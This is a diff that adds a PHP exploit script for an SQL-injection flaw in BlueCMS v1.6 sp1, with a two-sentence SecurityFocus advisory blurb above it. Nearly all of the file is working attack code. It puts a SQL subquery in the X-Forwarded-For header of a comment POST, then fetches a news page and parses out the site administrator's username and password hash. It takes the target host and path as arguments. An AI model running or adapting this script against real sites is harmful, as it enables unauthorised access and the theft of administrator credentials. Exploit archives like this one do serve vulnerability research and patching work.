@@ -1,0 +1,90 @@
+source: http://www.securityfocus.com/bid/42999/info
+
+BlueCMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+<?php
+print_r('
++---------------------------------------------------------------------------+
+BlueCMS v1.6 sp1 Getip() Remote SQL Injection Exploit
+by cnryan
+Mail: cnryan2008[at]gmail[dot]com
+Blog: http://hi.baidu.com/cnryan     
+
+            W . S . T                        
++---------------------------------------------------------------------------+
+');
+if ($argc < 3) {
+    print_r('
++---------------------------------------------------------------------------+
+Example:
+php '.$argv[0].' localhost /bluecms/
++---------------------------------------------------------------------------+
+');
+    exit;
+}
+error_reporting(7);
+ini_set('max_execution_time', 0);
+$host = $argv[1];
+$path = $argv[2];
+send();
+send2();
+function send()
+{
+    global $host, $path;
+    $cmd = "mood=6&comment=test&id=1&type=1&submit=%CC%E1%BD%BB%C6%C0%C2%DB";
+    $getinj=" 00','1'),('','1','0','1','6',(select concat('<u-',admin_name,'-u><p-',pwd,'-p>') from blue_admin),'1281181973','99";
+    $data = "POST ".$path."comment.php?act=send HTTP/1.1\r\n";
+    $data .= "Accept: */*\r\n";
+    $data .= "Accept-Language: zh-cn\r\n";
+    $data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+    $data .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
+    $data .= "Host: $host\r\n";
+    $data .= "Content-Length: ".strlen($cmd)."\r\n";
+    $data .= "Connection: Close\r\n";
+    $data .= "X-Forwarded-For: $getinj\r\n\r\n";
+    $data .= $cmd;
+
+    $fp = fsockopen($host, 80);
+    fputs($fp, $data);
+
+    $resp = '';
+
+    while ($fp && !feof($fp))
+        $resp .= fread($fp, 1024);
+
+    return $resp;
+}
+
+function send2()
+{
+global $host, $path;
+$message="GET ".$path."news.php?id=1 HTTP/1.1\r\n";
+$message.="Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */*\r\n";
+$message.="Accept-Language: zh-cn\r\n";
+$message.="Accept-Encoding: gzip, deflate\r\n";
+$message.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; GreenBrowser)\r\n";
+$message.="Host: $host\r\n";
+$message.="Connection: Keep-Alive\r\n\r\n";
+$fd = fsockopen($host,'80');
+if(!$fd)
+{
+    echo '[-]No response from'.$host;
+    die;
+}
+fputs($fd,$message);
+$resp = '';
+while (!feof($fd)) {
+    $resp.=fgets($fd);
+}
+fclose($fd);
+preg_match_all("/<u-([^<]*)-u><p-([^<]*)-p>/",$resp,$db);
+if($db[1][0]&$db[2][0])
+{
+echo "username->".$db[1][0]."\r\n";
+echo "password->".$db[2][0]."\r\n";
+echo "[+]congratulation ^ ^";
+}else die('[-]exploited fail >"<');
+}
+?>
